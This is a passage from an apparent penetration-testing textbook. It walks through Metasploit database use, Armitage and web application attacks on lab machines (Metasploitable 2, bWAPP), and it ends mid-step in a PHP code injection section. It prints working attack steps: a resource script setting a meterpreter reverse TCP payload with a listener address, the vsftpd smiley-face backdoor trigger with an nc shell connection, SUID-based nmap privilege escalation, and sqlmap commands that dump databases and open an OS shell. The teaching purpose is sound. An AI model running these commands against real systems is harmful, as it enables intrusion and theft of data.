One of the platform’s primary functions is to provide a space for developing, testing, and executing exploits against remote targets. It boasts a vast library of exploits, payloads, and auxiliary modules that allow users to assess and evaluate the security of computer systems and networks. Additionally, security professionals use Metasploit Framework to gauge the efficacy of their security defense and formulate defenses against potential attacks.

| Note: Metasploit is a versatile tool used for both offensive and defensive security purposes. Security professionals rely on it to test the effectiveness of their security measures and find potential vulnerabilities. |

[Metasploit database and workspace management](#contents.xhtml_sc2_134a)

Metasploit’s key attribute is its Metasploit database, which effectively stores and manages data pertaining to identified targets, vulnerabilities, sessions and exploits in a centralized database. For instance, when a vulnerability is discovered during an assessment, the Metasploit database can monitor the progress of exploiting the vulnerability and tracking the success of the attack.

Moreover, the stored database is useful for performing revalidation on all targets and open ports to check against the most recent exploitability status. Since the Metasploit database can be exported and imported with ease and shared among all pen testers, it allows for seamless collaboration from the current stage. Furthermore, the database enables the generation of detailed reports and provides extensive insights into the security posture of the target system.

Let us delve into the Metasploit database by following these steps and commands to create and manage a new workspace:

1.  Start the PostgreSQL server by running the command systemctl start postgresql as shown in [Figure 5.3](#ch05.xhtml_fig5-3):

    ![](images/Figure_5.3.png)

    Figure 5.3: Start the PostgreSQL server

2.  Launch the Metasploit Framework by using the command msfconsole as shown in [Figure 5.4](#ch05.xhtml_fig5-4) below:

    ![](images/Figure_5.4.png)

    Figure 5.4: Launch the Metasploit Framework

3.  Initialize the Metasploit database by running the command sudo msfdb init as shown in [Figure 5.5](#ch05.xhtml_fig5-5) below:

    ![](images/Figure_5.5.png)

    Figure 5.5: Initialize the Metasploit database

4.  To check the database connectivity status, run the command db_status as shown in [Figure 5.6](#ch05.xhtml_fig5-6) below:

    ![](images/Figure_5.6.png)

    Figure 5.6: Check the database connectivity status

5.  Create a new workspace using the command workspace -a [workspace_name] as demonstrated in [Figure 5.7](#ch05.xhtml_fig5-7):

    ![](images/Figure_5.7.png)

    Figure 5.7: Create a new workspace

6.  Select the newly created workspace using the command workspace [workspace_name] as shown in [Figure 5.8](#ch05.xhtml_fig5-8):

    ![](images/Figure_5.8.png)

    Figure 5.8: Select the newly created workspace

7.  View the complete list of available workspaces using the command workspace as depicted in [Figure 5.9](#ch05.xhtml_fig5-9):

    ![](images/Figure_5.9.png)

    Figure 5.9: View the complete list of available workspaces

| Note: Metasploit provides database management and workspace management features. The former involves managing the PostgreSQL database using ‘msfdb’, while the latter enables users to organize data related to different security assessments or projects. |

[Integrating NMAP scans with Metasploit](#contents.xhtml_sc2_135a)

After creating the Metasploit database, we can leverage its practical use cases in VAPT exercises. For instance, the Nmap scan result can be exported in XML format and imported into Metasploit to avoid the redundancy of port scanning. This feature can save significant effort and time for pen testers, as they can run one exploit on multiple targets simultaneously. Furthermore, the database allows for multilevel analysis of Nmap data, such as identifying how many assets have port 443 open or how many hosts are running Windows OS and so on.

To learn how to import Nmap scan results into Metasploit, run the command db_import [nmap_xml_file_name_and_path] using the file that we exported in the Vulnerability Assessment section of [Chapter 4](#ch04.xhtml), Vulnerability Assessment and Management, as demonstrated in [Figure 5.10](#ch05.xhtml_fig5-10):

![](images/Figure_5.10.png)

Figure 5.10: Import Nmap scan results into Metasploit

Now, to learn more about the step-by-step approach to exploit network-based vulnerabilities, you can follow the steps below, which include an example of exploiting the FTP service on the Metasploitable 2 machine:

1.  To refine your search in the entire database for Linux-based machines, execute the following filter-based command: hosts -c address,os_flavor -S Linux as illustrated in [Figure 5.11](#ch05.xhtml_fig5-11):

    ![](images/Figure_5.11.png)

    Figure 5.11: Refine your search in the entire database

2.  Similarly, to search for hosts with an open port 21, use the command services -c info,name -p 21, as demonstrated in [Figure 5.12](#ch05.xhtml_fig5-12):

    ![](images/Figure_5.12.png)

    Figure 5.12: Search for hosts with an open port 21

3.  To choose the shortlisted hosts as targets, execute the command services -c info,name -p 21 -R. This command will add all the hosts to the target list, and the same exploit will be executed consecutively on them, see [Figure 5.13](#ch05.xhtml_fig5-13):

    ![](images/Figure_5.13.png)

    Figure 5.13: Shortlisted hosts as targets

4.  To search for available exploits for a particular service in the database, execute the command search vsftpd as shown in [Figure 5.14](#ch05.xhtml_fig5-14) below:

    ![](images/Figure_5.14.png)

    Figure 5.14: Search for available exploits

5.  To select an appropriate payload from the exploit database, execute the command use exploit/unix/ftp/vsftpd_234_backdoor and then execute the command show options. You will see that the previously shortlisted targets are already reflected there, as illustrated in [Figure 5.15](#ch05.xhtml_fig5-15):

    ![](images/Figure_5.15.png)

    Figure 5.15: Use an appropriate exploit

6.  Furthermore, to find an appropriate payload, execute the command show payloads and then select the payload by executing the command set payload /cmd/unix/interact, as illustrated in [Figure 5.16](#ch05.xhtml_fig5-16):

    ![](images/Figure_5.16.png)

    Figure 5.16: Select the payload

7.  Once everything is set, execute the command exploit. After successful exploitation, a command shell will be opened to allow access. By using that, a pentester can execute any command and perform lateral movements. See [Figure 5.17](#ch05.xhtml_fig5-17):

    ![](images/Figure_5.17.png)

    Figure 5.17: Command shell

8.  To export the current Metasploit database in CSV, XML, or JSON format, use the command db_export -f [file_format] -o [output_file] as depicted in [Figure 5.18](#ch05.xhtml_fig5-18):

    ![](images/Figure_5.18.png)

    Figure 5.18: Export the current Metasploit database

[Metasploit automation](#contents.xhtml_sc2_136a)

Metasploit automation refers to the process of using scripts or tools to automate the execution of Metasploit modules, commands, and exploits. This approach can save time and effort for penetration testers by reducing manual work and avoiding repetitive tasks that allow for faster identification and exploitation of vulnerabilities. Metasploit automation can be achieved through the use of scripting languages such as Ruby or Python, or the simplest way is the resource file .rc. The scripts involves creating a script file with a .rc extension that contains the commands and parameters needed to execute Metasploit modules, commands, and exploits. These scripts can be executed from the command line using the msfconsole -r command, which reads the script file and executes the commands it contains.

Here is an example of a Metasploit resource script that can be used to automate the exploitation:

use use exploit/multi/http/php_cgi_arg_injection

set RHOSTS 192.168.149.129

set RPORT 80

set payload php/meterpreter_reverse_tcp

set LHOST 192.168.149.128

set LPORT 4444

exploit

To save the script, use the format [file_name].rc and save it to a directory. To initiate the script, run the command msfconsole -r [file_name_and_path] as shown in [Figure 5.19](#ch05.xhtml_fig5-19):

![](images/Figure_5.19.png)

Figure 5.19: Initiate the automation script

Once the Metasploit framework has loaded, it will read and execute the instructions from the resource file one by one, and establish a reverse meterpreter session. From there, the pentester can execute any command and perform lateral movement as shown in [Figure 5.20](#ch05.xhtml_fig5-20):

![](images/Figure_5.20.png)

Figure 5.20: Read and execute the instructions

| Note: Automating common tasks using Metasploit’s scripting language and resource files can provide many benefits, such as saving time, reducing errors, and enabling consistent and repeatable security assessments. |

[Starting with auxiliary and exploits](#contents.xhtml_sc2_137a)

The Metasploit framework offers a diverse range of modules designed to accomplish different tasks associated with penetration testing and vulnerability assessment.

[Auxiliary modules](#contents.xhtml_sc3_138a)

Auxiliary modules do not exploit vulnerabilities directly in the target system, but rather offer assistance to other modules in carrying out tasks like reconnaissance, scanning, fingerprinting, and enumeration. Port scanners, brute-force password crackers, and HTTP scanners are some instances of Auxiliary modules that can be found in Metasploit.

[Exploit modules](#contents.xhtml_sc3_139a)

Exploit modules leverage vulnerabilities found in the target system to obtain remote access or run code on the system. Exploit modules are grouped based on the type of vulnerability they capitalize on, examples of which include buffer overflows, SQL injection, and remote code execution.

[Post-exploitation modules](#contents.xhtml_sc3_140a)

In addition, Metasploit encompasses post-exploitation modules that come into play after an exploit has been accomplished. These modules assist in preserving access to the target system, boosting privileges, or accumulating extra data about the target system.

Let us explore a practical example to understand the roles of Auxiliary, Exploit, and Post-exploitation modules. We will use port 8010 on the Metasploitable 2 machine. Here’s a step-by-step guide that covers everything from gathering info to exploiting the vulnerability:

1.  Upon running Nmap on the Metasploitable 2 IP, it was observed that the 8180 port is open and running Tomcat service, as displayed in [Figure 5.21](#ch05.xhtml_fig5-21):

    ![](images/Figure_5.21.png)

    Figure 5.21: Running Nmap on the Metasploitable 2 IP

2.  An attempt to open the page on 8180 with the URL [http://metasploitableIP:8180](http://metasploitableip:8180/) will prompt the user to log in upon clicking any of the links in the left panel, as demonstrated in [Figure 5.22](#ch05.xhtml_fig5-22):

    ![](images/Figure_5.22.png)

    Figure 5.22: Open the page on 8180

3.  To obtain the login credentials, you can use the auxiliary/scanner/http/tomcat_mgr_login auxiliary module in msf and execute the required commands, as shown in [Figure 5.23](#ch05.xhtml_fig5-23):

    ![](images/Figure_5.23.png)

    Figure 5.23: Obtain the login credentials

4.  A successful run will display the login credentials, as shown in [Figure 5.24](#ch05.xhtml_fig5-24):

    ![](images/Figure_5.24.png)

    Figure 5.24: Login credentials

5.  After discovering the credentials, log in and navigate to the List Applications tab. Here, you will find various options for uploading files. You can attempt to exploit the upload vulnerability using an available exploit on msfconsole, or create a new exploit using msfvenom. See [Figure 5.25](#ch05.xhtml_fig5-25):

    ![](images/Figure_5.25.png)

    Figure 5.25: Log in with the discovered credentials

6.  For exploitation, the exploit/multi/http/tomcat_mgr_deploy module can be used. You must ensure that the username and password for manager are set along with the other options obtained from the auxiliary scan, as shown in [Figure 5.26](#ch05.xhtml_fig5-26):

    ![](images/Figure_5.26.png)

    Figure 5.26: Configure and run the exploit

7.  So, we got meterpreter session, but it does not grant root-level access, as displayed in [Figure 5.27](#ch05.xhtml_fig5-27):

    ![](images/Figure_5.27.png)

    Figure 5.27: Meterpreter session

8.  To escalate privileges and become a root user, you can try exploiting any Set User ID (SUID) set binary available. However, before running any commands, you should enter the shell from meterpreter by executing the command displayed in [Figure 5.28](#ch05.xhtml_fig5-28):

    ![](images/Figure_5.28.png)

    Figure 5.28: Shell from meterpreter

9.  You can then search for any binary with SUID bit set by running the command find / -type f -perm -4000 2>/dev/null. Many binaries with SUID bit set will be displayed, as shown in [Figure 5.29](#ch05.xhtml_fig5-29):

    ![](images/Figure_5.29.png)

    Figure 5.29: Search for any binary with SUID

10.  Using Nmap, you can perform privilege escalation and become a root user. Run command nmap --interactive as shown in [Figure 5.30](#ch05.xhtml_fig5-30):

    ![](images/Figure_5.30.png)

    Figure 5.30: Privilege escalation

11.  After obtaining root level access to Metasploitable 2, the user can engage in various lateral movements to achieve their goals, as depicted in [Figure 5.31](#ch05.xhtml_fig5-31):

    ![](images/Figure_5.31.png)

    Figure 5.31: Lateral movements

| Note: In summary, Metasploit comprises an assortment of module types, including Auxiliary modules for ancillary tasks, Exploit modules for capitalizing on vulnerabilities, and Post-exploitation modules for carrying out tasks subsequent to a successful exploit. |

[Manual exploitation](#contents.xhtml_sc2_141a)

Exploiting vulnerabilities without Metasploit requires advanced technical knowledge and a deep understanding of the target system and the vulnerability being exploited. One common approach is to write custom exploit code using programming languages like Python or C. Another approach is to use publicly available exploits or scripts, which can be modified to fit the target system and vulnerability.

To exploit the vsFTPd service on the Metasploitable 2 machine, we will use telnet and trigger the existing backdoor to gain reverse shell access. Follow these steps:

1.  Run the command telnet <IP address of Metasploitable 2> 21 in the terminal, as illustrated in [Figure 5.32](#ch05.xhtml_fig5-32):

    ![](images/Figure_5.32.png)

    Figure 5.32: Run telnet

2.  Enter the credentials by typing USER random string followed by a smiley face :) and then type PASS another random string and press Enter. To escape telnet, press Ctrl + ] and then press Enter as illustrated in [Figure 5.33](#ch05.xhtml_fig5-33):

    ![](images/Figure_5.33.png)

    Figure 5.33: Enter the credentials

3.  Once you have successfully exploited vsFTPd 2.3.4, a shell will be created and bound to port 6200 with root access. To connect to the shell, run the command nc <IP address of Metasploitable 2> 6200, as shown in [Figure 5.34](#ch05.xhtml_fig5-34):

    ![](images/Figure_5.34.png)

    Figure 5.34: Connect the shell on port 6200

| Note: It is important to note that the string :) plays a crucial role in successfully exploiting the vulnerability in vsFTPd version 2.3.4\. This particular version of vsFTPd contains a backdoor that was introduced in 2011\. The backdoor code is designed to search for a specific string entered by the user during the FTP server login process. If the backdoor finds the smiley face characters in the correct order, it triggers a function called vsf_sysutil_extra();, which opens a shell with root privileges. |

[Exploitation using Armitage](#contents.xhtml_sc2_142a)

Armitage is a user-friendly graphical cyber-attack management tool that simplifies the process of creating and executing attacks on a target system. It provides a visual interface for the popular open-source Metasploit framework, which is widely used for penetration testing and vulnerability assessment.

Armitage provides security professionals with the ability to launch pre-built Metasploit modules or customize attacks to suit their needs. It also includes features for collaboration, reporting, and tracking the progress of attacks, thereby making it an indispensable asset for ethical hackers. Furthermore, the tool’s visual interface simplifies the process of mapping out the network and identifying potential targets for attack.

[Setting up Armitage](#contents.xhtml_sc3_143a)

Here is a step-by-step approach to setting up Armitage in Kali Linux:

1.  Install Armitage by running the command sudo apt-get install armitage in the terminal, as shown in [Figure 5.35](#ch05.xhtml_fig5-35):

    ![](images/Figure_5.35.png)

    Figure 5.35: Install Armitage

2.  Start the PostgreSQL server by running the command sudo service postgresql start in the terminal, as illustrated in [Figure 5.36](#ch05.xhtml_fig5-36):

    ![](images/Figure_5.36.png)

    Figure 5.36: Start the PostgreSQL server

3.  Initialize the Metasploit database by running the command sudo msfdb init in the terminal, as demonstrated in [Figure 5.37](#ch05.xhtml_fig5-37):

    ![](images/Figure_5.37.png)

    Figure 5.37: Initialize the Metasploit database

4.  Launch Armitage by typing sudo armitage in the terminal as depicted in [Figure 5.38](#ch05.xhtml_fig5-38) below:

    ![](images/Figure_5.38.png)

    Figure 5.38: Launch Armitage

5.  Start the Metasploit Framework by clicking Connect as in step 4\. This links Armitage with the Metasploit Framework, allowing you to use the graphical interface to exploit vulnerabilities, shown in [Figure 5.39](#ch05.xhtml_fig5-39):

    ![](images/Figure_5.39.png)

    Figure 5.39: Armitage graphical user interface

| Note: Armitage’s GUI is divided into three sections: the first displays a dashboard that shows available hosts, services, and vulnerabilities, as well as a target list for selecting potential targets. The second section is an attack menu that offers various options for launching attacks. Finally, there is a console that displays detailed results, along with reporting features for generating comprehensive reports of the attacks. |

To better understand how to use Armitage in practice, let us explore an example of exploiting a PHP-related vulnerability. Here is a step-by-step guide using Armitage:

1.  To begin targeting a system in Armitage, click on the Hosts button and enter either the IP address or hostname of the target system in the Add Hosts field as shown in [Figure 5.40](#ch05.xhtml_fig5-40):

    ![](images/Figure_5.40.png)

    Figure 5.40: Add hosts to Armitage

2.  Next, perform an Intense scan of open ports and running services by navigating to Host | Nmap Scan as depicted in [Figure 5.41](#ch05.xhtml_fig5-41):

    ![](images/Figure_5.41.png)

    Figure 5.41: Intense scan

3.  After the Nmap scan is complete, you can search for exploits using keywords by going to the Attack menu and searching for the desired exploit (for example exploit/multi/http/php_cgi_arg_injection). Double-click on the exploit and provide any necessary information before launching it as depicted in [Figure 5.42](#ch05.xhtml_fig5-42):

    ![](images/Figure_5.42.png)

    Figure 5.42: Select and run the exploit

4.  After a successful exploit, the targeted host icon will display an electric coil and a shell window will open for further interaction as depicted in [Figure 5.43](#ch05.xhtml_fig5-43):

    ![](images/Figure_5.43.png)

    Figure 5.43: Shell interaction

5.  To explore additional attack options, right-click on the compromised host and open the shell 1 window for lateral movement, as depicted in [Figure 5.44](#ch05.xhtml_fig5-44):

    ![](images/Figure_5.44.png)

    Figure 5.44: Shell access

6.  If you are unsure of which exploit to use, navigate to the Attacks tab and try using features like Find Attacks or the Hail Mary attack as shown in [Figure 5.45](#ch05.xhtml_fig5-45):

    ![](images/Figure_5.45.png)

    Figure 5.45: Attack finder

| Note: Armitage provides a 'Hail Mary' attack feature, launching exploits without prior reconnaissance, often used as a last resort in situations of failed methods or time constraints, characterized by its high-risk, high-reward nature. |

[Conclusion](#contents.xhtml_sc2_144a)

In conclusion, this chapter serves as a valuable resource for pen testers to enhance their skills in identifying and exploiting vulnerabilities in a network. With practical examples and open-source tools, the chapter aims to deepen the pentester’s knowledge and understanding of the network’s security posture, enabling the development of effective mitigation strategies.

Network pen testing is critical to an organization’s security program, providing valuable insights into potential security risks and vulnerabilities within the network infrastructure. However, it requires a thorough understanding of the target environment’s infrastructure and potential vulnerabilities. Pen testers must approach their work with caution and professionalism to minimize any negative impact on the target environment.

The next chapter will cover basic and advanced web application exploitation techniques, including threat modeling, identifying and exploiting technical and business logic flows, and chaining together smaller vulnerabilities. Topics will include SQL injection, XSS, file inclusion, and more.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 6Exploiting Web Application](#contents.xhtml_ch06a)

[Introduction](#contents.xhtml_sc2_145a)

The main objective of this chapter is to provide a comprehensive introduction to web application exploitation. In today’s digital age, web applications have become an integral part of daily operations for individuals, businesses, and organizations, but they are also highly vulnerable to cyber-attacks. Therefore, it is crucial for web application auditors and penetration testers to have a thorough understanding of web application vulnerabilities and how to exploit them.

This chapter covers both the basics and advance-level vulnerability exploits for web applications. It explains the common attack vectors used by cyber attackers and teaches how to create threat models for efficient testing that align with the nature and category of the business. Additionally, you will learn to identify and exploit all technical and business logic flows in web applications and how to chain smaller vulnerabilities together to understand their impact better. By the end of this chapter, you will gain a complete understanding of the most advanced web application exploitation techniques. You will be equipped with the necessary knowledge to conduct sophisticated assessments.

[Structure](#contents.xhtml_sc2_146a)

In this chapter, we will discuss the following topics:

*   What is web app pen testing

    *   Web application pen testing approach

    *   Web application pen testing attack vectors

    *   OWASP top 10 for web application

*   Web application pen testing threat modeling

*   Web application pen testing mind map

*   Detecting web app firewalls and load balancers

*   Exploiting application-specific vulnerabilities

    *   SQL injection

    *   PHP code execution

    *   Brute force at login

    *   Broken authentication

    *   Insecure Direct Object Reference

    *   XSS using XSS validator

    *   Backdoor via unrestricted file upload HTTP Parameter Pollution

*   Business logic flaws

[Objectives](#contents.xhtml_sc2_147a)

This chapter introduces web application exploitation comprehensively, considering their significance and vulnerability in daily operations. It covers basic and advanced vulnerability exploits, teaches custom threat models, and highlights common attack vectors. Readers learn to identify and exploit technical and business logic vulnerabilities, gaining insights into assessing their collective impact. The chapter equips readers with advanced web application exploitation skills for sophisticated assessments and cybersecurity enhancement.

[What is web application pen testing](#contents.xhtml_sc2_148a)

Web application pen testing is a crucial process for ensuring the security of web applications by identifying vulnerabilities that could potentially be exploited by attackers. This process involves conducting various tests to detect any security flaws that could lead to unauthorized access or cause harm to the application or its users. Injection attacks, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), authentication and authorization vulnerabilities, information leakage, file inclusion vulnerabilities, insecure communications, Denial-Of-Service (DoS)  attacks, and weak cryptography are the most common attack vectors that are typically covered during web application pen testing. However, the specific tests conducted will depend on the objectives of testing and the characteristics of the web application under examination.

[Web application pen testing approach](#contents.xhtml_sc3_149a)

To perform advanced web application pen testing, a comprehensive and methodical approach is necessary to detect potential vulnerabilities and suggest recommendations for enhancing the security of the web application. Adhering to a standardized methodology is crucial to guarantee that all possible vulnerabilities are identified and resolved. Advanced web application pen testing is typically conducted in the following stages, illustrated in [Figure 6.1](#ch06.xhtml_fig6-1) below:

*   Planning and reconnaissance

*   Threat modeling and risk assessment

*   Vulnerability scanning

*   Manual testing

*   Exploitation and Proof-Of-Concept (POC) development

*   Reporting

![](images/Figure_6.1.png)

Figure 6.1: Web application pen testing approach

| Note: Web application pen testing is a vital component of web application security, which helps to identify vulnerabilities and strengthen the security posture of web applications. |

[Web application pen testing attack vectors](#contents.xhtml_sc3_150a)

Web application pen testing involves examining a range of attack vectors to detect vulnerabilities that could be exploited by malicious actors. The most prevalent attack vectors scrutinized in web application pen testing are the following:

*   Injection attacks

*   Cross-Site Scripting

*   Cross-Site Request Forgery

*   Authentication and authorization vulnerabilities

*   Information leakage

*   File inclusion vulnerabilities

*   Insecure communications

*   Denial-of-Service attacks

*   Weak cryptography

*   Broken access controls

*   Misconfiguration

*   Business logic flaws

*   Social engineering

[OWASP top 10 for web application](#contents.xhtml_sc3_151a)

The OWASP Top 10 is a compilation of the most severe security risks for web applications, identified and updated by the Open Web Application Security Project (OWASP) on a regular basis. It provides valuable guidance on the most significant vulnerabilities that web applications may encounter. The 2021 edition of the OWASP Top 10 for web applications comprises the following vulnerabilities:

*   Broken access control

*   Cryptographic failures

*   Injection

*   Insecure design

*   Security misconfiguration

*   Vulnerable and outdated components

*   Identification and authentication failures

*   Software and data integrity failures

*   Security logging and monitoring failures

*   Server-side request forgery

[Web application pen testing threat modeling](#contents.xhtml_sc2_152a)

Threat modeling is a process of systematically assessing and analyzing the potential risks associated with a system or application in order to develop appropriate mitigation strategies that can help reduce the likelihood and impact of a cyber-attack. When conducting web application pen testing, threat modeling can help security professionals prioritize potential vulnerabilities and guide their testing efforts. The steps given below can be taken while performing threat modeling in the context of web application pen testing:

*   Identify the assets

*   Define the architecture

*   Identify potential threats

*   Analyze the risks

*   Prioritize the threats

*   Develop mitigation strategies

*   Test the web application

Let us consider an example of a web-based e-commerce application that enables users to browse products, add items to their shopping cart, and complete purchases. Here is how the process of threat modeling could be applied to this application:

1.  Identify the assets: The e-commerce application relies on several assets, including user data (such as personally identifiable information, order history, and payment details), application servers, and network infrastructure.

2.  Define the architecture: The e-commerce application comprises a front-end web server, an application server that processes user requests, a load balancer, middleware, microservices, and a back-end database that stores user data.

3.  Identify potential threats: The e-commerce application may face various threats, such as SQL injection attacks, improper access controls, and exposure of sensitive data.

4.  Analyze the risks: SQL injection attacks may lead to unauthorized access to the database, while improper access controls may result in unauthorized modification of user data. The exposure of sensitive data could lead to the theft of user information.

5.  Prioritize the threats: Based on their potential risks and impact, the most critical threats to the e-commerce application may include SQL injection attacks, improper access controls, and exposure of sensitive data.

6.  Develop mitigation strategies: To address these threats, the e-commerce application could implement measures like using prepared statements to prevent SQL injection, setting up appropriate access controls to prevent unauthorized modification of user data, and encrypting sensitive data to prevent exposure.

7.  Test the web application: Finally, it is essential to test the e-commerce application using suitable tools and techniques to validate the effectiveness of the mitigation strategies and uncover any additional vulnerabilities.

| Note: Threat modeling is a crucial component of comprehensive web application penetration testing as it aids in identifying vulnerabilities that may otherwise be overlooked. It helps pen testers to develop a focused plan to mitigate risks and improve the overall security of the application. |

[Web application pen testing mind map](#contents.xhtml_sc2_153a)

A web application pen testing mind map visually represents the structure of the application and components to test for vulnerabilities. It organizes the testing process and is created using mind mapping software, whiteboards, or paper. The map includes nodes for areas such as input validation and session management, with sub-nodes for specific testing activities like vulnerability scanning and manual testing. It helps to ensure a comprehensive testing process and facilitates communication of testing strategy to the client, as demonstrated in [Figure 6.2](#ch06.xhtml_fig6-2):

![](images/Figure_6.2.png)

Figure 6.2: Web application pen testing mind map

The terms Client-side and Server-side, as depicted in [Figure 6.2](#ch06.xhtml_fig6-2), represent two pivotal pillars of application architecture. Let us delve deeper into the essence of these components.

Client-Side: When you use an application, the part that makes things look good and lets you interact is called the Client-Side. It works on your computer or phone and uses tools like HTML, CSS, and JavaScript to show you buttons, pictures, and responds when you click.

Server-Side: Imagine you are asking a question in an app. The Server-Side is like a helpful assistant sitting far away. It takes your question, figures out what you need, talks to databases, and sends back a useful answer. It takes care of the smart stuff like security, managing data, and making sure things run smoothly.

In [Table 6.1](#ch06.xhtml_tab6-1), let us grasp how both the Client-Side and Server-Side work together in application architecture:

| Aspect | Client-Side | Server-Side |
| Role | Creates appealing visuals, enables interactions using HTML, CSS, and JavaScript. | Acts as a distant assistant, processing your requests, conversing with databases, and furnishing valuable responses. Manages security, data, and seamless operation. |
| Where it Runs | Operates on your computer or phone. | Functions on a remote server. |
| Performance | Ensures smooth, speedy visuals on your device. | Tackles complex tasks for seamless performance, especially with intricate operations. |
| Security | Interacts directly | Shields your data and app as a security guard. |
| Data Handling | Displays images, responds to clicks. | Understands your needs, manages data, and delivers meaningful responses. |

Table 6.1: Synergy between Server-Side and Client-Side

[Detecting web app firewalls and load balancers](#contents.xhtml_sc2_154a)

It is essential to gather complete and accurate information about the targeted application. If the application deployment includes a Web Application Firewall (WAF) and Load Balancer (LB), they may affect the execution of payloads and responses from the application server. Any confusion or misunderstanding about the attack and response could result in vulnerability going unidentified or risk being miscalculated.

To identify the deployment of a WAF on a web application, the wafw00f <webapplication URL> command can be used, as shown in [Figure 6.3](#ch06.xhtml_fig6-3) below:

![](images/Figure_6.3.png)

Figure 6.3: Web Application Firewall detection

To identify the deployment of a LB on a web application, the lbd <webapplication URL> command can be used, as illustrated in [Figure 6.4](#ch06.xhtml_fig6-4) below:

![](images/Figure_6.4.png)

Figure 6.4: Load balancer detection

[Exploiting application-specific vulnerabilities](#contents.xhtml_sc2_155a)

Let us explore some of the specific vulnerabilities that are commonly found in web applications. These may include flaws in the application logic, configuration issues, or weaknesses in the code.

[SQL injection](#contents.xhtml_sc3_156a)

SQL injection is a dangerous vulnerability found in web applications, which a pen tester can exploit to inject malicious SQL statements via input fields. This vulnerability can lead to severe consequences, such as unauthorized disclosure of sensitive information, including personal data, passwords, or financial records. A pen tester can use this weakness to gain access to sensitive information, alter data, or even take complete control of the web application.

There are several types of SQL injection attacks that a pen tester should be aware of:

*   In-band SQL injection: In-band SQL injection allows the pen tester to send and receive attack results through the same channel. It is non-blind and poses a significant risk to web application security.

*   Blind SQL injection: Blind SQL injection is harder to detect since the pen tester does not receive direct database information but interprets clues from the response.

*   Out-of-band SQL injection: Out-of-band SQL injection uses a separate communication channel for sending and receiving the attack results, such as using a DNS query.

Pen testers should know the main SQL injection attack types, but attackers can use many variations and combinations to exploit vulnerabilities. Staying updated with the latest techniques is crucial.

To understand how SQL injection is exploited in practice, we will use an example of a single General Extensible Templates (GET) parameter of Buggy Web Application (bWAPP) and identify its SQL vulnerability before attempting to exploit it using sqlmap. sqlmap is a widely used open-source penetration testing tool that streamlines the detection and exploitation of SQL injection vulnerabilities in web applications. Here is a step-by-step approach to exploit SQL injection in the bWAPP (GET/search) page using sqlmap:

1.  Determine the target URL of the bWAPP (GET/search) page to test for SQL injection vulnerabilities, as shown in [Figure 6.5](#ch06.xhtml_fig6-5):

    ![](images/Figure_6.5.png)

    Figure 6.5: BWAPP (GET/search) page to test for SQL injection

2.  Detect SQL injection vulnerabilities in the target URL by using the command sqlmap -u <target URL> --random-agent shown in [Figure 6.6](#ch06.xhtml_fig6-6):

    Command: sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title= --cookie="PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0" --random-agent

    ![](images/Figure_6.6.png)

    Figure 6.6: Detect SQL injection vulnerabilities

3.  List all possible SQL injection types against the identified vulnerable parameter using the above command, as shown in [Figure 6.7](#ch06.xhtml_fig6-7):

    ![](images/Figure_6.7.png)

    Figure 6.7: List of all possible SQL injection types

4.  Analyze the target URL for SQL injection vulnerabilities and generate a list of available databases by using the command sqlmap -u <target URL> --random-agent --dbs shown in [Figure 6.8](#ch06.xhtml_fig6-8):

    Command: sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title= --cookie="PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0" --random-agent –dbs

    ![](images/Figure_6.8.png)

    Figure 6.8: List of available databases

5.  After obtaining the list of databases, display all tables in the selected database by running the command sqlmap -u <target URL> --random-agent -D <database name> --tables as shown in [Figure 6.9](#ch06.xhtml_fig6-9):

    Command: sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title= --cookie="PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0" --random-agent –D bwapp –tables

    ![](images/Figure_6.9.png)

    Figure 6.9: List of available tables in bWAPP database

6.  Retrieve the data from the target table or whole database by running the command sqlmap -u <target URL> --random-agent -D <database name> --dump as demonstrated in [Figure 6.10](#ch06.xhtml_fig6-10), and sqlmap will retrieve all the data from the target database and display it in the terminal window.

    Command: sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title= --cookie="PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0" --random-agent –D bwapp --dump

    ![](images/Figure_6.10.png)

    Figure 6.10: Data dump from targeted database

7.  Verify whether the current user account has administrative or Database Administrator (DBA) privileges on the target database by using the command sqlmap -u <target URL> --random-agent --is-dba as presented in [Figure 6.11](#ch06.xhtml_fig6-11):

    Command: sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title= --cookie="PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0" --random-agent --is-dba

    ![](images/Figure_6.11.png)

    Figure 6.11: Verify whether the current user account has administrative privileges

8.  Use the command sqlmap -u <target URL> --random-agent --os-shell to get the OS shell where the DBA is true. The OS shell is a command-line interface used for interacting with the operating system and performing various tasks such as running commands, automating tasks, customizing the environment, and debugging problems. See [Figure 6.12](#ch06.xhtml_fig6-12):

    Command: sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title= --cookie="PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0" --random-agent --os-shell

    ![](images/Figure_6.12.png)

    Figure 6.12: Get the OS shell where the DBA is true

| Note: Similar to SQL injection in GET parameters, SQL injection in POST parameters involves a malicious user inserting SQL statements into input fields on a website’s form, with the intention of exploiting backend database vulnerabilities and gaining unauthorized access to sensitive data, or even taking control of the entire web server. |

[PHP code execution](#contents.xhtml_sc3_157a)

PHP code execution, or Remote Code Execution (RCE), is a security flaw that enables attackers to run arbitrary code or commands on a server that runs PHP. This flaw arises when user input is not correctly sanitized or validated before being used in PHP functions that execute code, such as the eval() function. The vulnerability enables attackers to insert their PHP code onto the server and execute it. This could result in unauthorized access or total control over the system.

To gain a practical understanding of how the PHP code execution can be exploited, we will use the example of a single GET parameter in bWAPP. Below is a step-by-step approach to testing and exploiting a PHP code injection vulnerability in bWAPP:

1.  The PHP Code Injection page is a test page that displays a reflecting message. To see how it works, click on the message and a test message will appear, as shown in [Figure 6.13](#ch06.xhtml_fig6-13):

    ![](images/Figure_6.13.png)

    Figure 6.13: PHP code injection page

2.  You can edit the default message by modifying the URL to include your desired message. To do this, add message=your-message to the URL, as shown in [Figure 6.14](#ch06.xhtml_fig6-14):

